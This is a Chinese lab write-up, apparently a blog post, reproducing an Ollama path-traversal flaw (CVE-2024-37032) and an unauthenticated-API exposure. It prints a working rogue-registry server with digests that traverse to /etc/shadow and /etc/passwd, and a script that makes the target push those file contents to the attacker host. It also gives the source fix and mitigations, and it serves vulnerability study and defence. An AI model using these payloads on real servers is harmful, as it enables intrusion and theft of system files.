---
title: Ollama漏洞复现
published: 2025-08-07
description: '本文针对Ollama组件的两个漏洞进行了复现，漏洞编号分别为CVE-2024-37032和CNVD-2025-04094'
image: ''
tags: [Ollama组件漏洞,CVE,CNVD]
category: '技术'
draft: false 
lang: ''
---
## Ollama远程代码执行漏洞 CVE-2024-37032

### 漏洞概述

#### 受影响产品介绍

此漏洞影响所有Ollama 0.1.34版本以下的系统。

Ollama是一个专为在本地环境中运行和定制大型语言模型（LLM）而设计的开源工具。它提供了一个简单高效的接口，用于创建、运行和管理AI模型，同时还提供了一个丰富的预构建模型库，可以轻松集成到各种应用程序中。Ollama的主要目标是使大型语言模型的部署和交互变得简单，无论是对于开发者还是对于终端用户。

#### 漏洞原理

该漏洞允许通过路径遍历任意写入或读取文件。具体来说，漏洞存在于Ollama对digest字段验证不正确的问题上，服务器错误地将有效负载解释为合法的文件路径，攻击者可在digest字段中包含路径遍历payload的恶意清单文件，利用该漏洞实现任意文件读取/写入或导致远程代码执行。

攻击者可以通过构造特制的请求，利用此漏洞执行以下操作：任意文件读取：读取系统敏感文件（如/etc/passwd）；任意文件写入：写入恶意文件到目标系统；远程代码执行：通过写入特定文件位置实现代码执行

### 漏洞复现

#### 前期准备

准备两台linux系统的虚拟机，一台当攻击机，一台当靶机

攻击机 IP：192.168.159.156

靶机 IP：192.168.159.157

#### 环境搭建

在靶机上，使用以下Docker命令搭建漏洞环境：

```shell
docker run -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama:0.1.33
```

![图片 1](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403536.png)

docker 环境准备好之后，在靶机的浏览器测试ollama是否开启：

[http://127.0.0.1:11434/](http://localhost:11434/)

![图片 2](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403537.png)

查看正在运行的容器：docker ps

![图片 3](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403538.png)

#### 漏洞验证步骤

可以通过以下步骤验证漏洞：

克隆利用代码：git clone <https://github.com/Bi0x/CVE-2024-37032.git>

修改poc.py和server.py中的host变量和target_url变量为目标IP

运行server.py：python server.py

运行poc.py：python poc.py

验证是否能够读取目标系统的/etc/passwd文件

#### 漏洞利用

在攻击机上下载复现代码：

```shell
sudo git clone <https://github.com/Bi0x/CVE-2024-37032.git>
```

![图片 4](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403539.png)

进入刚刚下载的文件目录CVE-2024-37032

修改poc.py文件

![图片 5](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403540.png)

进入rogue_registry_server目录

修改server.py

![图片 6](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403541.png)

修改好之后，在攻击者电脑上以此运行server.py和poc.py

![图片 7](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403542.png)

![图片 8](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403543.png)

漏洞利用成功

### 漏洞技术细节

#### 利用方式

攻击者可以通过以下步骤利用此漏洞：

（1）在没有身份验证的Ollama服务器上，攻击者可通过操控服务器接口下载恶意文件

（2）通过模拟Ollama请求，构造一个恶意模型

（3）在digest字段设置路径穿越payload，例如：../../../../../../../../../../../../../etc/passwd

（4）利用Ollama的API接口（如/api/pull和/api/push）触发漏洞

漏洞的关键在于服务端对digest字段缺乏有效的验证和过滤，允许跨目录访问系统敏感文件。

#### 问题源码分析

**（1）源码存在漏洞的原因**

该漏洞的核心问题出现在服务器处理模块中的modelpath.go文件中。根据NVD的官方描述和GitHub提交记录，漏洞主要存在于处理digest字段的代码部分，主要是GetBlobsPath函数。

漏洞的根本原因是Ollama在处理模型路径时，没有对digest字段的格式进行严格验证。Ollama应该要求digest是符合SHA256格式的字符串（必须是64位十六进制数字），但漏洞版本中缺乏这种验证。

**（2）问题源码片段**

漏洞版本（v0.1.33及之前）中的问题代码片段如下：

```go
// 存在漏洞的代码

func GetBlobsPath(digest string) (string, error) {
dir, err := modelsDir()
if err != nil {
  return "", err
}
    
digest = strings.ReplaceAll(digest, ":", "-")
path := filepath.Join(dir, "blobs", digest)
dirPath := filepath.Dir(path)

if digest == "" {
  dirPath = path
}

if err := os.MkdirAll(dirPath, 0o755); err != nil {
  return "", err
}
    
return path, nil
}
```

这段代码的问题在于：

1. 没有验证digest是否符合SHA256格式（应为64位十六进制字符）
2. 直接将未经验证的digest拼接到文件路径中

这种实现使攻击者能够在digest参数中注入路径遍历序列，例如../../../../../../../../../etc/passwd，导致Ollama读取系统中的敏感文件，甚至写入恶意文件实现远程代码执行。

**（3）修复分析**

修复的核心思路是增加了对digest格式的严格验证。

修复后的代码：

```go
// 修复后的代码
func GetBlobsPath(digest string) (string, error) {
dir, err := modelsDir()

if err != nil {
  return "", err
}

// 确保了digest是合法的SHA256格式
pattern := "^sha256[:-][0-9a-fA-F]{64}$"
re := regexp.MustCompile(pattern)

if err != nil {
  return "", err
}

if digest != "" && !re.MatchString(digest) {
  return "", ErrInvalidDigestFormat
}

digest = strings.ReplaceAll(digest, ":", "-")
path := filepath.Join(dir, "blobs", digest)
dirPath := filepath.Dir(path)

if digest == "" {
  dirPath = path
}

if err := os.MkdirAll(dirPath, 0o755); err != nil {
  return "", err
}

return path, nil
}
```

这种修复方法通过正则匹配的方式有效防范了路径遍历攻击，确保了digest是合法的SHA256格式（长度为64的十六进制字符串）

#### payload作用原理

server.py代码如下

```python
from fastapi import FastAPI, Request, Response

HOST = "192.168.244.133"
app = FastAPI()

@app.get("/")
async def index_get():
    return {"message": "Hello rogue server"}

@app.post("/")
async def index_post(callback_data: Request):
    print(await callback_data.body())
    return {"message": "Hello rogue server"}

# for ollama pull
@app.get("/v2/rogue/bi0x/manifests/latest")
async def fake_manifests():
    return {"schemaVersion":2,"mediaType":"application/vnd.docker.distribution.manifest.v2+json","config":{"mediaType":"application/vnd.docker.container.image.v1+json","digest":"../../../../../../../../../../../../../etc/shadow","size":10},"layers":[{"mediaType":"application/vnd.ollama.image.license","digest":"../../../../../../../../../../../../../../../../../../../tmp/notfoundfile","size":10},{"mediaType":"application/vnd.docker.distribution.manifest.v2+json","digest":"../../../../../../../../../../../../../etc/passwd","size":10},{"mediaType":"application/vnd.ollama.image.license","digest":f"../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/{HOST}/rogue/bi0x/latest","size":10}]}

@app.head("/etc/passwd")
async def fake_passwd_head(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../etc/passwd"
    return ''

@app.get("/etc/passwd", status_code=206)
async def fake_passwd_get(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../etc/passwd"
    response.headers["E-Tag"] = "\"../../../../../../../../../../../../../etc/passwd\""
    return 'cve-2024-37032-test'

@app.head(f"/root/.ollama/models/manifests/{HOST}/rogue/bi0x/latest")
async def fake_latest_head(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest"
    return ''

@app.get(f"/root/.ollama/models/manifests/{HOST}/rogue/bi0x/latest", status_code=206)
async def fake_latest_get(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest"
    response.headers["E-Tag"] = "\"../../../../../../../../../../../../../root/.ollama/models/manifests/dev-lan.bi0x.com/rogue/bi0x/latest\""
    return {"schemaVersion":2,"mediaType":"application/vnd.docker.distribution.manifest.v2+json","config":{"mediaType":"application/vnd.docker.container.image.v1+json","digest":"../../../../../../../../../../../../../etc/shadow","size":10},"layers":[{"mediaType":"application/vnd.ollama.image.license","digest":"../../../../../../../../../../../../../../../../../../../tmp/notfoundfile","size":10},{"mediaType":"application/vnd.ollama.image.license","digest":"../../../../../../../../../../../../../etc/passwd","size":10},{"mediaType":"application/vnd.ollama.image.license","digest":f"../../../../../../../../../../../../../../../../../../../root/.ollama/models/manifests/{HOST}/rogue/bi0x/latest","size":10}]}

@app.head("/tmp/notfoundfile")
async def fake_notfound_head(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../tmp/notfoundfile"
    return ''

@app.get("/tmp/notfoundfile", status_code=206)
async def fake_notfound_get(response: Response):
    response.headers["Docker-Content-Digest"] = "../../../../../../../../../../../../../tmp/notfoundfile"
    response.headers["E-Tag"] = "\"../../../../../../../../../../../../../tmp/notfoundfile\""
    return 'cve-2024-37032-test'

# for ollama push
@app.post("/v2/rogue/bi0x/blobs/uploads/", status_code=202)
async def fake_upload_post(callback_data: Request, response: Response):
    print(await callback_data.body())
    response.headers["Docker-Upload-Uuid"] = "3647298c-9588-4dd2-9bbe-0539533d2d04"
    response.headers["Location"] = f"http://{HOST}/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D"
    return ''

@app.patch("/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04", status_code=202)
async def fake_patch_file(callback_data: Request):
    print('patch')
    print(await callback_data.body())
    return ''

@app.post("/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04", status_code=202)
async def fake_post_file(callback_data: Request):
    print(await callback_data.body())
    return ''

@app.put("/v2/rogue/bi0x/manifests/latest")
async def fake_manifests_put(callback_data: Request, response: Response):
    print(await callback_data.body())
    response.headers["Docker-Upload-Uuid"] = "3647298c-9588-4dd2-9bbe-0539533d2d04"
    response.headers["Location"] = f"http://{HOST}/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D"
    return ''

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host='0.0.0.0', port=80)
```

poc.py代码如下：

```python
import requests

HOST = "192.168.47.149"
target_url = f"http://192.168.47.130:11434"

vuln_registry_url = f"{HOST}/rogue/bi0x"

pull_url = f"{target_url}/api/pull"
push_url = f"{target_url}/api/push"

requests.post(pull_url, json={"name": vuln_registry_url, "insecure": True})
requests.post(push_url, json={"name": vuln_registry_url, "insecure": True})

# see rogue server log
```

**（1）攻击基础架构**

攻击者需要两个主要组件来实施完整的攻击：

**目标服务器**：运行有漏洞版本的Ollama（<0.1.34）

**恶意服务器**：作为"rogue registry"（恶意注册表服务器），用于响应Ollama的请求

**（2）Payload的组成部分**

完整的漏洞利用payload由两部分组成：

**发送到目标Ollama的请求**：向Ollama API发送的JSON请求

**恶意服务器的响应**：包含路径遍历序列的manifest文件

**（3）攻击流程和Payload执行机制**

这种攻击的完整执行流程如下：

**初始化请求**：攻击者向Ollama的/api/pull端点发送请求，要求它从恶意服务器获取"模型"：

```json
{
  "name": "攻击者服务器IP/rogue/bi0x",
  "insecure": true
}
```

其中：

1. name字段指向攻击者控制的恶意服务器
2. insecure: true参数允许不验证SSL证书，便于攻击执行

**Ollama响应**：

1. Ollama接收请求并尝试连接到指定的恶意服务器
2. 根据Docker Registry API规范，它请求manifest文件

**恶意服务器返回Payload**：恶意服务器返回一个特制的manifest文件，关键部分包含路径遍历：

```python
@app.get("/v2/rogue/bi0x/manifests/latest")
async def fake_manifests():
    return {
        "schemaVersion": 2,
        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
        "config": {
            "mediaType": "application/vnd.docker.container.image.v1+json",
            "digest": "../../../../../../../../../../../../../etc/passwd",
            "size": 10
        },
        "layers": [
            {
                "mediaType": "application/vnd.ollama.image.license",
                "digest": "../../../../../../../../../../../../../../../../../../../tmp/notfoundfile",
                "size": 10
            },
            {
                "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
                "digest": "../../../../../../../../../../../../../etc/passwd",
                "size": 10
            }
        ]
    }
```

**漏洞触发**：

Ollama处理收到的manifest，并尝试访问digest字段指定的文件

由于缺乏对digest字段的格式验证，它将路径遍历序列（如../）作为合法路径的一部分处理

路径遍历使得Ollama访问了预期目录之外的系统文件（如/etc/passwd）

**数据获取**：

```json
{
  "name": "攻击者服务器IP/rogue/bi0x",
  "insecure": true
}
```



1. 攻击者随后发送/api/push请求，触发Ollama将读取的文件内容发送回恶意服务器

#### 为什么Payload能够成功执行？

Payload能够成功执行的原因有以下几点：

**输入验证缺失**：

Ollama没有验证digest字段是否符合SHA256格式（应为64位十六进制字符）

缺少对路径遍历序列的检测和过滤

**Docker Registry API的信任**：

1. Ollama信任外部Registry返回的manifest数据，未进行足够的安全检查

insecure: true参数绕过了SSL验证，使攻击者能轻松架设恶意服务器

**文件路径构建的缺陷**：

未处理的digest字段直接参与文件路径构建

路径遍历序列在文件路径解析时生效，导致访问到系统任意文件

**API设计问题**：

/api/push接口在未做充分身份验证的情况下可将内部文件内容发送到外部

通过这种精心设计的payload，攻击者成功地将一个看似无害的模型拉取请求转变为对系统文件的未授权访问，从而实现了远程文件读取甚至可能的远程代码执行。

#### 修复方案

（1）临时缓解措施

如无法立即升级到最新版本，建议采取以下临时措施：

限制Ollama服务的网络访问，避免将其暴露在公网上

在防火墙层面限制对Ollama服务端口（默认11434）的访问

实施网络分段，隔离Ollama服务

（2）建议措施

为了防范CVE-2024-37032漏洞带来的风险，建议采取以下措施：

及时更新：确保Ollama系统及时更新到最新版本0.1.34或更高版本

加强监控：部署有效的安全监控系统，及时发现并响应异常行为

权限控制：严格限制系统权限，避免攻击者利用低权限账户进行攻击

安全培训：加强员工的安全意识培训，提高整体安全防护水平

## Ollama未授权访问漏洞CNVD-2025-04094

### 漏洞概述

该漏洞源于其默认未设置身份验证和访问控制功能，未经授权的攻击者可在远程条件下调用 Ollama 服务接口，进而执行包括但不限于敏感模型资产窃取、虚假信息投喂、模型计算资源滥用和拒绝服务、系统配置篡改和扩大利用等恶意操作。那些未设置身份验证和访问控制功能且暴露在公共互联网上的 Ollama，极易受到此漏洞攻击影响。

**影响版本**：Ollama所有版本均受此漏洞影响（未设置访问认证的情况下）。根据官方REST API规范，Ollama暴露以下核心接口端点实现模型管理功能。

**API 参考文档** -- Ollama 中文文档|Ollama官方文档：<https://ollama.cadn.net.cn/api.html>

/api/generate 用于生成文本或内容。通常用于基于给定的输入生成响应或输出，例如生成对话回复、文章等。

/api/chat 专门用于聊天交互。用户可以通过此端点与模型进行对话，模型会根据输入生成相应的回复。

/api/create 用于创建新的模型或资源。可能涉及初始化一个新的模型实例或配置。

/api/ps(或者tags) 用于管理或查看模型的标签。标签可以帮助用户对模型进行分类或标记，便于管理和查找。

/api/show用于显示模型或资源的详细信息。用户可以获取模型的配置、状态或其他相关信息。

/api/copy 用于复制模型或资源。用户可以通过此端点创建一个现有模型的副本。

/api/delete 用于删除模型或资源。用户可以通过此端点移除不再需要的模型或数据。

/api/pull 用于从 Ollama 下载模型。用户可以通过此端点将模型从远程服务器拉取到本地环境中。

/api/push 用于将模型上传到 Ollama。用户可以通过此端点将本地模型推送到远程服务器。

/api/embeddings 用于生成文本的嵌入向量。嵌入向量是文本的数值表示，通常用于机器学习任务中的特征提取。

/api/version 用于获取 Ollama 的版本信息。用户可以通过此端点查询当前使用的 Ollama 版本。

当运维人员未启用身份认证机制时，攻击者可构造恶意请求操纵造成模型资源劫持、敏感训练数据泄露算力资源滥用。

### 漏洞复现

#### 环境准备

依旧使用前面拉取到的ollama镜像，先确认镜像是否存在：sudo docker images

![图片 9](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403544.png)

执行下面的命令启动容器

```shell
docker run -d \                                                           
  --name ollama \
  -p 11434:11434 \
  -v ollama_data:/root/.ollama \
  ollama/ollama:0.1.33
```

执行docker ps可以看到容器已经正常启动，可以看到端口是0.0.0.0（虚拟机中的环境在物理机也能访问到）

![图片 10](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403545.png)

浏览器可以访问：

![图片 11](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403546.png)

拉取模型（如 llama3）：

```shell
docker exec ollama ollama pull llama3
```

![图片 12](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403547.png)

查看可用模型：

```shell
docker exec ollama ollama list
```

![图片 13](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403548.png)

执行这个命令可以开启交互式对话：docker exec -it ollama ollama run llama3

#### 漏洞利用

在未启用身份认证的环境下，访问/api/version，返回Ollama的版本信息

![图片 14](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403549.png)

访问/api/tags，成功响应将返回JSON格式模型清单，包含模型指纹信息

响应信息中可以看到采用的是llama3:latest模型

![图片 15](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403550.png)

结合上文已知的接口端点信息，可以调用/api/generate（使用POST请求），使用yakit抓包并修改添加如下内容

#在请求头中添加

Content-Type: application/json

在请求体中添加

```json
{ "model": "llama3:latest", "prompt": "请介绍下你自己。", "stream": false }
```

![图片 16](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403551.png)

如果顺利的话，服务会返回AI模型生成内容，说明接口被完全绕过，无需认证。

![图片 17](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403552.png)

如果一直显示发包中，右边没有响应

![图片 18](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403553.png)

因为虚拟机性能不够，这里显示的cpu占用了99%

![图片 19](https://raw.githubusercontent.com/Aur0r3-zy/picture/main/img/20250807233403554.png)

#### 性能优化建议

**量化模型**：选择带量化后缀的模型（如 llama3:8b-q4_K_M）

**启动参数**：

```shell
docker run -d \
  --name ollama \
  -e OLLAMA_NUM_PARALLEL=2 \  # 并行请求数
  -e OLLAMA_KEEP_ALIVE=5m \   # 模型内存驻留时间
  ...
```

根据硬件配置不同，8B参数的模型在GPU上通常能达到20+ tokens/s的生成速度。

#### 其他命令

监控资源：`docker stats ollama`

删除大模型：`docker exec -it ollama ollama rm 模型名`

停止ollama容器：`docker stop ollama`

重启ollama容器：`docker start ollama`

删除ollama容器：`docker rm ollama`

通过引导deepseek回答问题的过程中可以造成部分信息的泄露。

所以在未授权的情况下，其他的接口均可利用，极具危害性，攻击者可通过调用这些危险接口进行操作，可实现对模型的创建或删除等操作。

#### 防御措施

1、若Ollama只提供本地服务，设置环境变量Environment="OLLAMA_HOST=127.0.0.1"，仅允许本地访问。

2、若Ollama需提供公网服务，选择以下方法添加认证机制：

修改config.yaml、settings.json 配置文件，限定可访问Ollama 服务的IP地址；

通过防火墙等设备配置IP白名单，阻止非授权IP的访问请求；

通过反向代理进行身份验证和授权（如使用OAuth2.0协议），防止未经授权用户访问。